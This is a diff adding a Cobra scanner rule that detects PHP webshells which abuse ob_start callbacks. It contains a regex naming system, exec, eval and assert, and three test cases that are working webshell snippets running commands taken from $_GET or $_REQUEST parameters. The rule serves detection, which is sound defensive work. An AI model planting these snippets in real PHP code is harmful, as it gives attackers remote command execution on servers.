@@ -1,0 +1,36 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cobra document="https://github.com/wufeifei/cobra">
+    <name value="webshell26"/>
+    <language value="php"/>
+    <match mode="regex-only-match"><![CDATA[ob_start\s*\(+\s*(['\"]\s*(eval|assert|ass\\x65rt|system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec).{0,20}|['\"]\s*\w+[\s\S]{1,50}phpinfo\s*\(\s*\))]]></match>
+    <level value="7"/>
+    <test>
+        <case assert="true"><![CDATA[
+            $cb= 'system';
+            ob_start($cb);
+            echo $_GET[c];
+            ob_end_flush();
+        ]]></case>
+        <case assert="true"><![CDATA[
+            $evalstr="";
+            ob_start(function ($c,$d){global $evalstr;$evalstr=$c;});
+            echo $_REQUEST['pass'];
+            ob_end_flush();
+            assert($evalstr);
+        ]]></case>
+        <case assert="true"><![CDATA[
+            ob_start(function ($c,$d){register_shutdown_function('assert',$c);});
+            echo $_REQUEST['pass'];
+            ob_end_flush();
+        ]]></case>
+    </test>
+    <solution>
+        ## 安全风险
+        代码中存在webshell
+
+        ## 修复方案
+        删除
+    </solution>
+    <status value="off"/>
+    <author name="Feei" email="feei@feei.cn"/>
+</cobra>
